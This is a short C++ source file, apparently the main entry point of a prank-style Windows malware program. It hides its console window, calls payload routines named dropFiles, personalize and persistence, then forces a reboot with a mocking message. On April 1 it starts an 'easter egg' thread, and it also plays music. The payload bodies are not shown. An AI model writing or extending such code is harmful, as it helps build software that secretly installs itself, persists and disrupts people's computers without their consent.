#include "./Payloads/payloads.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
	
	
	ShowWindow(GetConsoleWindow(), 0);
	if (Payloads::dropFiles() == 1){
		
		Payloads::personalize();
		Payloads::persistence();
		
		ShellExecuteA(NULL, NULL, "shutdown", " /r /t 5 /c \"Can you blow my whistle baby, whistle baby, let me know [...]\"", NULL, 0);
		
		ExitProcess(0);
	}
	
	if (Payloads::firstOfApril() == 1)
		CreateThread(NULL, 0, Payloads::easterEgg, NULL, 0, NULL);
	Payloads::music();

	
	return 0;
}